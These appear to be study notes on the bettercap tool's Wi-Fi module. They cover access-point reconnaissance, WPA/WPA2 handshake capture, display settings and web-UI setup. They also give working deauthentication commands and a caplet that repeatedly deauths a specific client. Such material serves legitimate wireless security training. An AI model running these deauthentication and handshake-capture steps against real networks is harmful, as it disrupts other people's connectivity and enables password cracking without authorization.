BETTERCAP shares some capabilities with airodump-ng, aireplay-ng, and airbase-ng or hostapd-mana. Unlike many of the other tools, bettercap provides some interface flexibility. 

sudo apt install bettercap
sudo bettercap -iface wlan0

Change the interface for the Wi-Fi module by running 
set wifi.interface wlanX

Several commands in the Wi-Fi module that will be useful to us.

 recon: Scan the 802.11 spectrum for APs and capture WPA/WPA2 handshakes.
 deauth: Deauthenticate clients from an AP.
 show: Display the discovered wireless stations.
 ap:Create a rogue AP.
 
 Discovery APs
 
 wifi.recon.on
 wifi.recon.channel 6,11
   
 events.ignore wifi.ap.new
 events.ignore wifi.client.new
 events.ignore wifi.client.probe
 
 events.stream.on (can turn alerts on and off completely)  [INCLUDES TAB COMPLETION]
 
 wifi.show [displays captured result]
 
 set ticker.commands “clear; wifi.show”
 ticker on
 
  set wifi.show.sort clients desc 
  wifi.recon <bssid>
  wifi.show
 
 
 EXTRAS
wifi.show.limit: This parameter adds an upper limit to the number of clients or APs displayed. The integer we enter will be the maximum number. Entering "0" will disable the limit.
wifi.show.manufacturer: This parameter adds an additional column to the table listing the manufacturers of the wireless device. It is set to "false" by default.
wifi.sta.ttl: This parameter is how long bettercap should wait before marking a client as disconnected. It is measured in seconds and the default is 300 (five minutes).
wifi.skip-broken: If this parameter is set to true, which it is by default, an invalid checksum in an 802.11 packet will be skipped.
set wifi.rssi.min -49
set wifi.show.filter ^c0
set wifi.show.filter "" (To clear any filter)

DISCONNECTING A CLIENT

wifi.deauth<bssid , client bssid , ff:ff:ff:ff:ff:ff>

wifi.recon off
get wifi.handshakes.file
set wifi.handshakes.file "/home/kali/handshakes/"
set wifi.handshakes.aggregate false (not paste handshake fiiles in same file)
wifi.recon on


wifi.deauth.acquired parameter is set to false by default and will prevent bettercap from sending deauthentication packets if the handshake has already been captured. 
wifi.deauth.open parameter is set to true by default and instructs bettercap to send deauthentication packets to open networks.
wifi.deauth.silent parameter is set to false by default and, if set to true, will instruct bettercap to hide the deauthentication messages in the terminal.
set wifi.deauth.skip ac:22:0b:28:fd:22 (to skip a client)

CAPLETS

cd /usr/share/bettercap/caplets 
cat -n massdeauth.cap

sudo mousepad deauth_corp.cap
" set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}

set ticker.period 10
set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8

events.ignore wifi.ap.new
events.ignore wifi.client.probe
events.ignore wifi.client.new

wifi.recon on
ticker on
events.clear
clear "

RUNNING THE CAPLET

include death_corp.cap

OR

sudo bettercap -iface wlan0 -caplet deauth_corp.cap


WEB INTERFACE ( EXTRA ) (RUNS ON PORT 443 AND MAKES CALL TO API SERVER ON 8083)

  sudo nft add table inet filter
  sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
  sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept
  sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept
 
 mousepad /usr/share/bettercap/caplets/https-ui.cap  ( CHANGE THE USERNAME AND PASS WORD )
 bettercap -iface wlan0 -caplet https-ui.cap
 firefox https://kaliremote   [accept risk and continue in anotehr tab for further process]
 
 
